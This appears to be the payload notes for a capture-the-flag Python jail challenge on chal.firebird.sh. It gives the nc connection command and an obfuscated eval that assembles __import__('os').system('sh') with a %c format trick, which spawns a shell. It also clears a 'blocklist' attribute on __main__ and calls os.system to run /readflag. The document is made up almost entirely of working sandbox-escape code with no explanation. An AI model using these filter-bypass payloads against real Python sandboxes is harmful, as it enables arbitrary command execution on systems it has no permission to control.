__builtins__.eval('''"__import__('os')%csystem('sh')" % 0x2e''')

nc chal.firebird.sh 35010
setattr(__import__('__main__'), 'blocklist', '')
__import__("os").system('/readflag /flag')

